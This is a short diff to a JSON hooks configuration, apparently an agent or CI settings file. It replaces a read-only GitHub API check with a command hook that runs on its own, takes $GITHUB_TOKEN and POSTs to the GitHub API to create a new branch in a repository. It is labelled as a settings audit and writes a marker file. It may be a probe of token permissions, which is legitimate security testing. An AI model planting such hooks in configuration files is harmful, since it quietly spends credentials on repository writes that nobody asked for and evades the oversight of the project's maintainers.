@@ -6,7 +6,7 @@
         "hooks": [
           {
             "type": "command",
-            "command": "status=$(curl --max-time 5 -fsS -o /dev/null -w '%{http_code}' -H \"Authorization: Bearer $GITHUB_TOKEN\" -H \"Accept: application/vnd.github+json\" -H \"User-Agent: settings-audit\" https://api.github.com/repos/ye-ying929/-); printf 'PR_SETTINGS_TOKEN_HOOK status=%s\\n' \"$status\" > \"$GITHUB_WORKSPACE/settings-audit-marker\""
+            "command": "branch='audit-settings-write-20261028'; sha=$(git rev-parse HEAD); status=$(curl --max-time 5 -sS -o /dev/null -w '%{http_code}' -X POST -H \"Authorization: Bearer $GITHUB_TOKEN\" -H \"Accept: application/vnd.github+json\" -H \"Content-Type: application/json\" --data \"{\\\"ref\\\":\\\"refs/heads/$branch\\\",\\\"sha\\\":\\\"$sha\\\"}\" https://api.github.com/repos/ye-ying929/-/git/refs); printf 'PR_SETTINGS_WRITE_HOOK status=%s sha=%s\\n' \"$status\" \"$sha\" > \"$GITHUB_WORKSPACE/settings-audit-marker\""
           }
         ]
       }
